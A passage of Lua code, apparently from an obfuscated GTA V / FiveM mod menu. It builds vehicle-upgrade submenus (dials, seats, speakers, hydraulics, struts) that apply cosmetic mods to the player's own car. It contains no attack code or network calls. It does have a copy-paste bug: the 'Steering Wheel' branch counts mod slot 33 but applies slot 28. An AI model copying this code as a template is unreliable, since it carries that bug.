                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 29, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 29, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Dial" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 30)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 30, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 30, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil    
                                end
                            elseif curvopt1 == "Door Speaker" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 31)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 31, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 31, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil               
                                end
                            elseif curvopt1 == "Seats" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 32)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 32, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 32, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil                               
                                end
                            elseif curvopt1 == "Steering Wheel" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 33)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 33, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 28, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Shifter Leavers" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 34)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 34, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 34, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil               
                                end
                            elseif curvopt1 == "Plaques" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 35)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 35, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end

                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 35, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil                           
                                end
                            elseif curvopt1 == "Speakers" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 36)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 36, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 36, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil                                
                                end
                            elseif curvopt1 == "Hydraulics" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 38)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 38, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 38, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil    
                                end
                            elseif curvopt1 == "Engine Block" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 39)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 39, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 39, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil    
                                end
                            elseif curvopt1 == "Air Filter" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 40)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 40, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 40, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil            
                                end
                            elseif curvopt1 == "Struts" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 41)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 41, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 41, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil                 
                                end                         
                            elseif curvopt1 == "Arch Cover" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 42)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 42, j)
